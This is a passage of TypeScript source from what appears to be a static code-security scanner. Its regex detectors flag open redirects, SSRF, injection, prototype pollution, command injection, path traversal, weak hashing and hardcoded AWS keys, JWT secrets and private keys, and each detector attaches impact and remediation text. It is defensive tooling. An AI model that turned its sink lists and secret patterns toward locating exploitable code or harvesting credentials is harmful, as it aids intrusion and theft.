  private calculateSeverityFromControllability(
    controllability: 'high' | 'medium' | 'low',
    category: string,
    sinkSeverity?: 'error' | 'warning' | 'info'
  ): { severity: 'error' | 'warning' | 'info'; confidence: 'very-high' | 'high' | 'medium' | 'low' } {
    // High severity categories (code execution)
    const criticalCategories = ['DOM-XSS', 'JavaScript-Injection'];
    
    if (controllability === 'high') {
      if (criticalCategories.includes(category)) {
        return { severity: 'error', confidence: 'very-high' };
      }
      return { severity: sinkSeverity || 'warning', confidence: 'high' };
    }
    
    if (controllability === 'medium') {
      if (criticalCategories.includes(category)) {
        return { severity: 'warning', confidence: 'high' };
      }
      return { severity: 'warning', confidence: 'medium' };
    }
    
    // Low controllability
    return { severity: 'info', confidence: 'low' };
  }

  /** Build vulnerability message with proper classification */
  private buildVulnerabilityMessage(
    category: string,
    sinkName: string,
    taintedVars: string[],
    sourceNames: string,
    controllability: 'high' | 'medium' | 'low'
  ): string {
    const varsStr = taintedVars.join(', ');
    const controllabilityNote = controllability === 'high' 
      ? 'directly controllable via URL/navigation'
      : controllability === 'medium'
      ? 'requires user interaction or prior injection'
      : 'limited attack surface';
    
    switch (category) {
      case 'DOM-XSS':
        return `DOM XSS: ${sinkName} receives tainted data from [${varsStr}] (${sourceNames}). Source is ${controllabilityNote}.`;
      case 'Replace-XSS':
        return `String.replace XSS (CVE-2025-27108): ${sinkName} with tainted replacement from [${varsStr}]. $' and $\` execute.`;
      case 'JavaScript-Injection':
        return `JavaScript Injection: ${sinkName} executes tainted data from [${varsStr}] (${sourceNames}). Source is ${controllabilityNote}.`;
      case 'Open-Redirect':
        return `Open Redirect: ${sinkName} navigates to URL from [${varsStr}] (${sourceNames}). Source is ${controllabilityNote}.`;
      case 'Link-Manipulation':
        return `Link Manipulation: ${sinkName} sets URL attribute from [${varsStr}] (${sourceNames}). May enable phishing.`;
      case 'Client-Side-Request-Forgery':
        return `Client-Side Request Forgery: ${sinkName} makes request to URL from [${varsStr}] (${sourceNames}).`;
      case 'WebSocket-Hijacking':
        return `WebSocket Hijacking: Connection URL from [${varsStr}] (${sourceNames}). Attacker may intercept communications.`;
      case 'Storage-Injection':
        return `Storage Injection: ${sinkName} stores tainted data from [${varsStr}]. May enable persistent XSS.`;
      case 'PostMessage-Abuse':
        return `PostMessage Security: ${sinkName} sends data from [${varsStr}]. Verify origin validation.`;
      default:
        return `Tainted Data Flow: ${sinkName} uses [${varsStr}] from ${sourceNames}.`;
    }
  }

  /** Get impact description for vulnerability category */
  private getImpactForCategory(category: string, controllability: 'high' | 'medium' | 'low'): string {
    const base: Record<string, string> = {
      'DOM-XSS': 'Execute arbitrary JavaScript in victim\'s browser, steal cookies, hijack sessions.',
      'Replace-XSS': 'Replacement string $\' and $` execute. Attacker can inject via user-controlled replacement.',
      'JavaScript-Injection': 'Execute arbitrary code, full compromise of client-side application.',
      'Open-Redirect': 'Redirect users to malicious sites for phishing or malware distribution.',
      'Link-Manipulation': 'Modify links to point to attacker-controlled destinations.',
      'Client-Side-Request-Forgery': 'Make requests to internal resources or external APIs on behalf of victim.',
      'WebSocket-Hijacking': 'Intercept or manipulate real-time communications.',
      'Storage-Injection': 'Persist malicious data that may trigger XSS on future page loads.',
      'PostMessage-Abuse': 'Cross-origin data exfiltration or message spoofing.',
    };
    
    const impact = base[category] || 'Potential security vulnerability.';
    if (controllability === 'low') {
      return `${impact} (Note: Limited exploitation due to low controllability)`;
    }
    return impact;
  }

  /** Get remediation for vulnerability category */
  private getRemediationForCategory(category: string): string {
    const remediations: Record<string, string> = {
      'DOM-XSS': 'Use DOMPurify.sanitize() for HTML, or textContent/innerText for text-only content.',
      'Replace-XSS': 'Use function replacement: str.replace(regex, (m) => sanitize(m)). Never pass user input as replacement string.',
      'JavaScript-Injection': 'Avoid eval/Function constructor with user input. Use JSON.parse for data.',
      'Open-Redirect': 'Validate redirect URLs against an allowlist of trusted origins.',
      'Link-Manipulation': 'Validate URLs and ensure they use expected protocols (https://).',
      'Client-Side-Request-Forgery': 'Validate request URLs against allowlist. Use origin-based CORS.',
      'WebSocket-Hijacking': 'Validate WebSocket URL origin before connecting.',
      'Storage-Injection': 'Sanitize data before storing. Validate on retrieval before use in sinks.',
      'PostMessage-Abuse': 'Always validate event.origin against expected domains.',
    };
    return remediations[category] || 'Validate and sanitize user input before use.';
  }

  /** Build compact flow path for manual review: "L12 → L45 → L67" */
  private buildFlowPathSummary(taintTraces: TaintTraceEntry[]): string {
    if (!taintTraces.length) return '';
    const lines = [...new Set(taintTraces.map(t => t.line).filter(Boolean))].sort((a, b) => a - b);
    return lines.map(l => `L${l}`).join(' → ');
  }

  /** Boost confidence when source and sink are close (same logical block) */
  private confidenceFromDistance(earliestSourceLine: number, sinkLine: number, baseConfidence: 'very-high' | 'high' | 'medium' | 'low'): 'very-high' | 'high' | 'medium' | 'low' {
    const distance = Math.abs(sinkLine - earliestSourceLine);
    if (distance <= 5 && (baseConfidence === 'high' || baseConfidence === 'medium')) return 'very-high';
    if (distance <= 15 && baseConfidence === 'medium') return 'high';
    return baseConfidence;
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // OPEN REDIRECT SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanOpenRedirect(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;
    
    const redirectSinks = [
      { pattern: /(?:location|window\.location)\.(?:href|assign|replace)\s*\(\s*(.+?)\s*\)/, name: 'location.assign/replace' },
      { pattern: /(?:location|window\.location)\.href\s*=\s*(.+?)(?:;|$)/, name: 'location.href' },
      { pattern: /(?:location|window\.location)\s*=\s*(.+?)(?:;|$)/, name: 'window.location' },
    ];

    lines.forEach((line, index) => {
      for (const { pattern, name } of redirectSinks) {
        const m = pattern.exec(line);
        if (!m) continue;

        const rhs = (m[1] ?? '').trim();
        const ids = this.extractIdentifiers(rhs);
        const usedTainted = ids.filter(id => taintedVars.has(id));
        
        if (usedTainted.length === 0) continue;
        
        // Check for URL validation
        if (Scanner.URL_VALIDATORS.test(this.getContext(ctx, index, 8))) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);
        const sourceInfo = usedTainted.map(v => taintedVars.get(v)!);

        results.push(this.createValidatedResult({
          ruleId: 'open-redirect',
          severity: 'warning',
          message: `Open redirect: ${name} with user-controlled URL from [${usedTainted.join(', ')}]. Validate against URL allowlist.`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Open-Redirect',
          cwe: 'CWE-601',
          confidence: 'high',
          taintTrace: sourceInfo.map(s => ({
            type: 'source' as const,
            line: s.sourceLine,
            variable: s.name,
            expression: s.sourceExpression,
            description: `User input from: ${s.sourceExpression.slice(0, 60)}`,
          })),
          remediation: 'Validate redirect URLs against an allowlist of trusted origins.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // SSRF SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanSSRF(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;
    
    const httpSinks = [
      { pattern: /\bfetch\s*\(\s*(.+?)(?:,|\))/, name: 'fetch()' },
      { pattern: /\baxios\.(?:get|post|put|delete|patch)\s*\(\s*(.+?)(?:,|\))/, name: 'axios' },
      { pattern: /\bhttp\.(?:get|request)\s*\(\s*(.+?)(?:,|\))/, name: 'http.get/request' },
      { pattern: /\bhttps\.(?:get|request)\s*\(\s*(.+?)(?:,|\))/, name: 'https.get/request' },
      { pattern: /\bgot\s*\(\s*(.+?)(?:,|\))/, name: 'got()' },
      { pattern: /\brequest\s*\(\s*(.+?)(?:,|\))/, name: 'request()' },
      { pattern: /\bnew\s+WebSocket\s*\(\s*(.+?)\s*\)/, name: 'WebSocket' },
    ];

    lines.forEach((line, index) => {
      for (const { pattern, name } of httpSinks) {
        const m = pattern.exec(line);
        if (!m) continue;

        const urlArg = (m[1] ?? '').trim();
        const ids = this.extractIdentifiers(urlArg);
        const usedTainted = ids.filter(id => taintedVars.has(id));
        
        // Also check for direct server source usage
        const hasServerSource = Scanner.SERVER_SOURCES.some(p => p.test(urlArg));
        
        if (usedTainted.length === 0 && !hasServerSource) continue;
        
        // Check for URL validation
        if (Scanner.URL_VALIDATORS.test(this.getContext(ctx, index, 10))) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);

        results.push(this.createValidatedResult({
          ruleId: 'ssrf',
          severity: 'error',
          message: `SSRF: ${name} with user-controlled URL. Attacker may access internal resources or exfiltrate data.`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'SSRF',
          cwe: 'CWE-918',
          confidence: usedTainted.length > 0 ? 'high' : 'medium',
          impact: 'Attacker can make server-side requests to internal services, cloud metadata endpoints, or exfiltrate data.',
          remediation: 'Validate URLs against allowlist. Block requests to internal IPs (127.0.0.1, 10.x, 172.16-31.x, 192.168.x, 169.254.x).',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // DOM CLOBBERING SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanDOMClobbering(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;

    const patterns = [
      { pattern: /document\s*\[\s*([^\]]+)\s*\]/g, name: 'document[key]' },
      { pattern: /window\s*\[\s*([^\]]+)\s*\]/g, name: 'window[key]' },
    ];

    lines.forEach((line, index) => {
      for (const { pattern, name } of patterns) {
        let m: RegExpExecArray | null;
        pattern.lastIndex = 0;

        while ((m = pattern.exec(line)) !== null) {
          const key = (m[1] ?? '').trim();
          
          // Skip static string keys
          if (/^['"][^'"]*['"]\s*$/.test(key)) continue;

          const ids = this.extractIdentifiers(key);
          const usedTainted = ids.filter(id => taintedVars.has(id));
          const hasDynamicKey = /\b(location|URLSearchParams|searchParams|hash|query|params|name|id)\b/i.test(key);

          if (usedTainted.length > 0 || hasDynamicKey) {
            const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);

            results.push(this.createValidatedResult({
              ruleId: 'dom-clobbering',
              severity: 'info',
              message: `DOM clobbering risk: ${name} with dynamic key. Attacker may override DOM properties via HTML injection.`,
              line: index + 1,
              column: (m.index ?? 0) + 1,
              file: url,
              pattern: pattern.toString(),
              matchedCode: evidence.text,
              matchedCodeHighlights: evidence.highlights,
              contextCode: evidence.text,
              contextStartLine: evidence.startLine,
              contextEndLine: evidence.endLine,
              category: 'DOM-Clobbering',
              cwe: 'CWE-1321',
              confidence: usedTainted.length > 0 ? 'medium' : 'low',
              remediation: 'Use Object.hasOwn() to check property existence. Avoid dynamic property access on document/window.',
            }));
          }
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // SERVER-SIDE INJECTION SCANNER (SQL, NoSQL, LDAP)
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  /** Lines that are never SQL/NoSQL/LDAP (logging, errors, non-DB) - skip to avoid FPs */
  private static readonly INJECTION_NON_DB_LINE: RegExp[] = [
    /console\.(log|warn|error|info|debug|trace)\s*\(/i,
    /logger\.(log|warn|error|info|debug)\s*\(/i,
    /throw\s+new\s+(Error|TypeError|RangeError)\s*\(/,
    /(?:reject|resolve)\s*\(\s*new\s+Error/i,
    /\.(toString|toLowerCase|toUpperCase|trim|slice|substring)\s*\(\s*\)/,
    /String\s*\(\s*[^)]*\)\s*\.\s*(replace|match|split)/,
    /^\s*\/\/|^\s*\/\*|^\s*\*/,
    /(?:fetch|axios|request)\s*\([^)]*\)\s*\.(then|catch)/,
    /(?:describe|it|test|expect)\s*\(/,
  ];

  private scanServerSideInjection(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;

    const injectionPatterns = [
      // SQL Injection - only when DB/query API is clearly involved
      { pattern: /\.(query|execute|executeQuery|executeUpdate)\s*\(\s*['"`][^'"`]*\+/i, message: 'SQL injection: Dynamic query construction with string concatenation.', cwe: 'CWE-89', category: 'SQL-Injection' },
      { pattern: /\.(query|execute)\s*\(\s*`[^`]*\$\{[^`]*`/i, message: 'SQL injection: Query built with template literal (user input may be interpolated).', cwe: 'CWE-89', category: 'SQL-Injection' },
      { pattern: /(?:prepareStatement|createQuery|raw)\s*\(\s*['"`][^'"`]*\+/i, message: 'SQL injection: Prepared/raw query with concatenated input.', cwe: 'CWE-89', category: 'SQL-Injection' },
      { pattern: /\.query\s*\(\s*['"`][^'"`]*\+.*['"`]/i, message: 'SQL injection: Query with concatenated user input.', cwe: 'CWE-89', category: 'SQL-Injection' },
      // NoSQL Injection
      { pattern: /\$where\s*[:=]\s*['"`][^'"`]*\+/i, message: 'NoSQL injection: $where operator with dynamic input.', cwe: 'CWE-943', category: 'NoSQL-Injection' },
      { pattern: /\$expr\s*[:=]\s*['"`][^'"`]*\+/i, message: 'NoSQL injection: $expr operator with dynamic input.', cwe: 'CWE-943', category: 'NoSQL-Injection' },
      // LDAP Injection
      { pattern: /ldap\.(search|bind)\s*\(\s*['"`][^'"`]*\+/i, message: 'LDAP injection: Dynamic LDAP query construction.', cwe: 'CWE-90', category: 'LDAP-Injection' },
    ];

    // Sink patterns for taint-based detection: capture group 1 = variable passed to sink
    const sinkPatterns = [
      { pattern: /\.(?:query|execute|executeQuery|executeUpdate)\s*\(\s*(\w+)/i, category: 'SQL-Injection', cwe: 'CWE-89' },
      { pattern: /\.(?:query|execute)\s*\(\s*`[^`]*\$\{(\w+)/i, category: 'SQL-Injection', cwe: 'CWE-89' },
      { pattern: /\$where\s*[:=]\s*(\w+)/i, category: 'NoSQL-Injection', cwe: 'CWE-943' },
      { pattern: /\$expr\s*[:=]\s*(\w+)/i, category: 'NoSQL-Injection', cwe: 'CWE-943' },
      { pattern: /ldap\.(?:search|bind)\s*\(\s*(\w+)/i, category: 'LDAP-Injection', cwe: 'CWE-90' },
    ];

    const pushedForLine = new Set<number>();
    lines.forEach((line, index) => {
      if (Scanner.INJECTION_NON_DB_LINE.some((re) => re.test(line))) return;

      // Pattern-based: require tainted data in the line (identifiers used in query construction)
      for (const { pattern, message, cwe, category } of injectionPatterns) {
        const m = pattern.exec(line);
        if (!m) continue;
        const ids = this.extractIdentifiers(line);
        const usedTainted = ids.filter(id => taintedVars.has(id) && !taintedVars.get(id)!.sanitized);
        if (usedTainted.length === 0) continue;
        const hasParameterization = /(?:prepareStatement|parameterized|placeholder|\?\s*\)|:\w+\s*\)|\$1|\$\d+)/i.test(line);
        if (hasParameterization) continue;
        const contextStr = this.getContext(ctx, index, 8);
        if (/(?:\.query\s*\(\s*['"`][^'"`]*\?|\.execute\s*\(|\.prepare\s*\(|parameterized)/i.test(contextStr)) continue;

        pushedForLine.add(index);
        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);
        const sourceNames = usedTainted.map(v => taintedVars.get(v)?.sourceName).filter(Boolean).join(', ');
        results.push(this.createValidatedResult({
          ruleId: `${category.toLowerCase()}-tainted`,
          severity: 'error',
          message: `CRITICAL: ${message} Tainted data from [${usedTainted.join(', ')}] (${sourceNames}).`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category,
          cwe,
          confidence: 'high',
          taintTrace: usedTainted.map(v => taintedVars.get(v)!).map(s => ({
            type: 'source' as const,
            line: s.sourceLine,
            variable: s.name,
            expression: s.sourceExpression,
            description: `User input: ${s.sourceName}`,
          })),
          impact: 'Attacker can read, modify, or delete database records. May lead to full database compromise.',
          remediation: 'Use parameterized queries or prepared statements. Never concatenate user input into queries.',
        }));
      }

      // Taint-based: sink receives tainted variable (e.g. .query(userInput)) — only if no pattern-based result was added for this line
      if (!pushedForLine.has(index)) {
        for (const { pattern, category, cwe } of sinkPatterns) {
          const m = pattern.exec(line);
          if (!m) continue;
          const argId = (m[1] ?? '').trim();
          if (!taintedVars.has(argId) || taintedVars.get(argId)!.sanitized) continue;
          const hasParameterization = /(?:prepareStatement|parameterized|placeholder|\?\s*\)|:\w+\s*\))/i.test(line);
          if (hasParameterization) continue;
          const contextStr = this.getContext(ctx, index, 8);
          if (/(?:\.query\s*\(\s*['"`][^'"`]*\?|\.execute\s*\(|\.prepare\s*\(|parameterized)/i.test(contextStr)) continue;

          const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);
          const s = taintedVars.get(argId)!;
          results.push(this.createValidatedResult({
            ruleId: `${category.toLowerCase()}-tainted-var`,
            severity: 'error',
            message: `CRITICAL: Tainted variable "${argId}" (from ${s.sourceName}) flows into query/DB sink. Use parameterized queries.`,
            line: index + 1,
            column: (m.index ?? 0) + 1,
            file: url,
            pattern: pattern.toString(),
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category,
            cwe,
            confidence: 'high',
            taintTrace: [{ type: 'source', line: s.sourceLine, variable: argId, expression: s.sourceExpression, description: `User input: ${s.sourceName}` }],
            impact: 'Attacker can read, modify, or delete database records.',
            remediation: 'Use parameterized queries or prepared statements. Never pass user input directly to query APIs.',
          }));
          pushedForLine.add(index);
          break;
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION SCANNER (strict mode - reduced false positives)
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanPrototypePollution(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars, code } = ctx;

    // Skip if code looks minified (too long lines = likely obfuscated/minified library code)
    const avgLineLen = code.length / Math.max(1, lines.length);
    if (avgLineLen > 200) return; // Skip minified code

    lines.forEach((line, index) => {
      const trimmed = line.trim();
      
      // Skip comments, tests, and obvious safe contexts
      if (/^\s*(\/\/|\/\*|\*|#|describe|it\(|test\(|expect\()/i.test(trimmed)) return;
      if (/\.test\.|\.spec\.|__tests__|fixtures|mock/i.test(url)) return;
      
      // Direct __proto__ or constructor.prototype assignment - ONLY if tainted variable is used
      if (/(__proto__|constructor\.prototype)\s*[:=]\s*[^=]/i.test(line)) {
        const hasUserInput = taintedVars.size > 0 && 
          [...taintedVars.keys()].some(v => line.includes(v));
        
        // STRICT: require actual tainted variable, not just keyword presence
        if (hasUserInput) {
          const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

          results.push(this.createValidatedResult({
            ruleId: 'prototype-pollution-critical',
            severity: 'error',
            message: 'CRITICAL: Prototype pollution vulnerability. Attacker can inject properties into Object.prototype.',
            line: index + 1,
            column: 1,
            file: url,
            pattern: '/(__proto__|constructor\\.prototype)\\s*[:=]\\s*[^=]/i',
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: 'Prototype-Pollution',
            cwe: 'CWE-1321',
            confidence: 'high',
            impact: 'Attacker can modify application behavior, bypass security checks, or achieve RCE in some environments.',
            remediation: 'Use Object.create(null) for dictionaries. Validate/sanitize object keys. Use Map instead of plain objects.',
          }));
        }
      }

      // Object.assign/merge with user input - include lodash, deepExtend (2025-2026)
      const mergePatterns = [
        /Object\.(assign|merge|extend)\s*\(/i,
        /(?:lodash|_)\s*\.\s*(?:merge|extend|assign|defaultsDeep)\s*\(/,
        /(?:merge|extend|defaultsDeep)\s*\(\s*(?:req|request|body|query|params|input)/i,
        /(?:deepExtend|deepMerge|deepAssign)\s*\(/i,
      ];
      const hasMerge = mergePatterns.some(p => p.test(line));
      if (hasMerge && /(?:req|request|body|query|params|input|user|data)\b/i.test(line)) {
        // Skip if there's key filtering or allowlist
        if (/(?:pick|omit|allowlist|whitelist|filter|sanitize)\s*\(/i.test(line)) return;
        if (/Object\.keys\s*\(.*\)\.filter/i.test(line)) return;
        
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'prototype-pollution-high',
          severity: 'warning', // Downgrade to warning (was error)
          message: 'Potential prototype pollution via Object.assign/merge with user-controlled input.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: '/Object\\.(assign|merge)\\s*\\([^)]*(req|request|body|query|params)/i',
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Prototype-Pollution',
          cwe: 'CWE-1321',
          confidence: 'medium',
          remediation: 'Filter __proto__, constructor, and prototype keys from user input before merging. Use pick/omit or allowlist.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // INSECURE DESERIALIZATION SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanInsecureDeserialization(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      // eval with user input
      if (/eval\s*\(\s*(req|request|body|query|params|input)/i.test(line)) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'insecure-deserialization-critical',
          severity: 'error',
          message: 'CRITICAL: Remote Code Execution via eval() with user input.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: '/eval\\s*\\(\\s*(req|request|body|query|params|input)/i',
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'RCE',
          cwe: 'CWE-502',
          confidence: 'high',
          impact: 'Attacker can execute arbitrary code on the server.',
          remediation: 'Never use eval() with user input. Use JSON.parse() for data deserialization.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // COMMAND INJECTION SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanCommandInjection(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    const commandPatterns = [
      /child_process\.(exec|execSync|spawn|spawnSync)\s*\(\s*[^)]+\)/,
      /(?:^|[^\w.])exec(?:Sync)?\s*\(\s*['"`][^'"`]*\+/,
    ];

    lines.forEach((line, index) => {
      for (const pattern of commandPatterns) {
        if (!pattern.test(line)) continue;

        // Require user input as identifier (req.body, req.query, etc.) not just substring in string
        const hasUserInput = /\b(?:req|request)\.(?:body|query|params|headers)\b|\b(?:body|query|params)\s*[=,\)]/.test(line);
        const hasStringConcat = /['"`][^'"`]*\+|\+\s*['"`]|`[^`]*\$\{/.test(line);
        if (!hasUserInput && !hasStringConcat) continue;

        const contextStr = this.getContext(ctx, index, 5);
        if (/(?:escape|sanitize|validate|whitelist|allowlist|shellescape)/i.test(contextStr)) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'command-injection-critical',
          severity: 'error',
          message: 'CRITICAL: Command injection vulnerability. Attacker can execute arbitrary OS commands.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Command-Injection',
          cwe: 'CWE-78',
          confidence: 'high',
          impact: 'Attacker can execute arbitrary commands on the server, leading to full system compromise.',
          remediation: 'Use execFile/spawnSync with array arguments. Never construct commands with string concatenation.',
        }));
        break;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // PATH TRAVERSAL SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanPathTraversal(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    const filePatterns = [
      /fs\.(readFile|writeFile|readFileSync|writeFileSync|createReadStream|createWriteStream)\s*\(\s*[^)]*(?:req|request|body|query|params|\.path|\.file)/i,
      /require\s*\(\s*(?!['"][^'"]*['"]\s*\))(?:req|request|body|query|params|[^'"]*(?:req|request)\.[^)]*)/i,
      /path\.(join|resolve)\s*\([^)]*(?:req|request|body|query|params)/i,
    ];

    lines.forEach((line, index) => {
      for (const pattern of filePatterns) {
        if (!pattern.test(line)) continue;

        const contextStr = this.getContext(ctx, index, 5);
        if (Scanner.PATH_VALIDATORS.test(contextStr)) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'path-traversal-critical',
          severity: 'error',
          message: 'CRITICAL: Path traversal vulnerability. Attacker can access files outside intended directory.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Path-Traversal',
          cwe: 'CWE-22',
          confidence: 'high',
          impact: 'Attacker can read sensitive files (/etc/passwd, config files) or overwrite critical files.',
          remediation: 'Use path.resolve() and verify the resolved path starts with the expected base directory.',
        }));
        break;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // INSECURE CRYPTO SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanInsecureCrypto(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      // Weak hash algorithms
      if (/crypto\.createHash\s*\(\s*['"](md5|sha1)['"]/i.test(line)) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'weak-crypto',
          severity: 'error',
          message: 'HIGH: Weak cryptographic hash (MD5/SHA1). These algorithms are cryptographically broken.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: '/crypto\\.createHash\\([\'"]?(md5|sha1)/i',
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Weak-Crypto',
          cwe: 'CWE-328',
          confidence: 'high',
          remediation: 'Use SHA-256 or SHA-3 for hashing. For passwords, use bcrypt, scrypt, or Argon2.',
        }));
      }

      // Hardcoded secrets
      const secretPatterns = [
        { pattern: /(?:AWS|aws)_?(?:ACCESS|access)_?(?:KEY|key)[^"']{0,10}["']([A-Z0-9]{20})["']/, name: 'AWS Access Key' },
        { pattern: /(?:AWS|aws)_?(?:SECRET|secret)_?(?:KEY|key)[^"']{0,10}["']([A-Za-z0-9/+=]{40})["']/, name: 'AWS Secret Key' },
        { pattern: /(?:mongodb|mongo):\/\/[^"']*["']/, name: 'MongoDB Connection String' },
        { pattern: /(?:api|API)_?(?:key|Key|KEY)[^"']{0,10}["']([A-Za-z0-9\-_]{20,})["']/, name: 'API Key' },
        { pattern: /(?:JWT|jwt)_?(?:SECRET|secret)[^"']{0,10}["']([A-Za-z0-9\-_]{20,})["']/, name: 'JWT Secret' },
        { pattern: /(?:PRIVATE|private)_?(?:KEY|key)[^"']{0,10}["'](-----BEGIN[^-]+-----)/, name: 'Private Key' },
      ];

      for (const { pattern, name } of secretPatterns) {
        if (!pattern.test(line)) continue;

        // Skip if it's from environment variable
        if (/process\.env\[?['"]|process\.env\.|config\[?['"]|\.env/i.test(line)) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'hardcoded-secret',
          severity: 'error',
          message: `CRITICAL: Hardcoded ${name} detected. Secrets must not be committed to source code.`,
          line: index + 1,
          column: 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Hardcoded-Secret',
          cwe: 'CWE-798',
          confidence: 'high',
          impact: 'Secrets in source code can be extracted from version control, leading to unauthorized access.',
          remediation: 'Use environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault).',
        }));
        break;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // TRUST BOUNDARY CROSSING SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanTrustBoundaryCrossing(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    const trustPatterns = [
      { pattern: /\b(?:req|request)\.user\s*=\s*([^;]+)/i, name: 'req.user' },
      { pattern: /\bres\.locals\.user\s*=\s*([^;]+)/i, name: 'res.locals.user' },
      { pattern: /\bctx\.state(?:\.user)?\s*=\s*([^;]+)/i, name: 'ctx.state' },
      { pattern: /\bsession\.(?:user|userId|role|admin)\s*=\s*([^;]+)/i, name: 'session property' },
    ];

    lines.forEach((line, index) => {
      for (const { pattern, name } of trustPatterns) {
        const m = pattern.exec(line);
        if (!m) continue;

        const rhs = m[1]?.trim();
        if (!rhs) continue;

        // Check if RHS is user-controlled
        const isUserControlled = /(?:req\.(?:body|query|params)|request\.(?:body|query|params))/i.test(rhs);
        if (!isUserControlled) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);

        results.push(this.createValidatedResult({
          ruleId: 'trust-boundary-crossing',
          severity: 'error',
